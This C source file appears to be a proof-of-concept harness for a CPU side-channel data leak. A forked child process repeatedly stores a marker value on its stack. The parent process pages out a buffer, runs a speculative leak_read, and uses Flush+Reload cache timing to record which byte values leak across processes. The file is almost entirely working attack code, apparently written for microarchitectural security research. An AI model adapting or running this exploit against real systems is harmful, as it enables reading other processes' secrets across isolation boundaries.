#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/mman.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <signal.h>

#include "asm.h"
#include "flush_and_reload.h"

int main() {
  pid_t pid = fork();
	if (pid == 0) {
		while (1)
			asm volatile(
				"movq %0, (%%rsp)\n"
				"mfence\n"
				// ::"r"(0x4847464544434241ull));
				::"r"(0x4141414141414141ull));
	}
	if (pid < 0) return 1;

  // struct sigaction sa = {0};
  // sa.sa_handler = SIG_IGN;
  // sigaction(SIGSEGV, &sa, NULL);

  const size_t PAGE_SIZE = getpagesize();
  const size_t NR_VALUES = 256;

  // Where we will read from
  const size_t leak_size = PAGE_SIZE;
  void* leak_buffer = mmap(NULL, leak_size*2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
  assert(leak_buffer != NULL);

  // Where we will measure the cache times
  const size_t reload_size = PAGE_SIZE * NR_VALUES;
  void* reload_buffer = mmap(NULL,
                        reload_size,
                        PROT_READ,
                        MAP_PRIVATE | MAP_ANONYMOUS,
                        -1,
                        0);
  assert(reload_buffer != NULL);

  size_t results[NR_VALUES];
  memset(results, 0, NR_VALUES * sizeof(size_t));

  // Determine a threshold for when a cache is hot or cold
  size_t threshold = measure_in_cache_threshold_time(reload_buffer);
  printf("Threshold: %ld\n", threshold);

  for (int i = 0; i < 100000; ++i) {
    // char* leak_buffer_ptr = (char*)leak_buffer;
      // *leak_buffer_ptr = 'A';

    // Page out the leak buffer
    int adv = madvise(leak_buffer, leak_size, MADV_DONTNEED);
    assert(adv == 0);

    flush(NR_VALUES, PAGE_SIZE, reload_buffer);
    // clflush(leak_buffer);
    leak_read(leak_buffer, reload_buffer);
    reload(NR_VALUES, PAGE_SIZE, reload_buffer, results, threshold);
  }

  for (size_t i = 0; i < NR_VALUES; ++i) {
    printf("%lx\t%ld\n", i, results[i]);
  }

  kill(pid, 9);

  return 0;
}
